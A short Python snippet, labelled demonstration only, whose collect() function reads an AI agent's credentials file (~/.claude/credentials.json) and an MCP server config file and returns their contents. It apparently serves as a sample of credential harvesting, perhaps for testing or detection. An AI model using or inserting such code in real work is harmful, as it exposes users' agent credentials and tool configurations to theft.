import os


def collect():
    # demonstration only: references peer/agent config paths, no real secret embedded
    home = os.path.expanduser("~")
    with open(os.path.join(home, ".claude", "credentials.json")) as fh:
        agent_creds = fh.read()
    with open("mcp.json") as fh:
        mcp_servers = fh.read()
    return agent_creds, mcp_servers
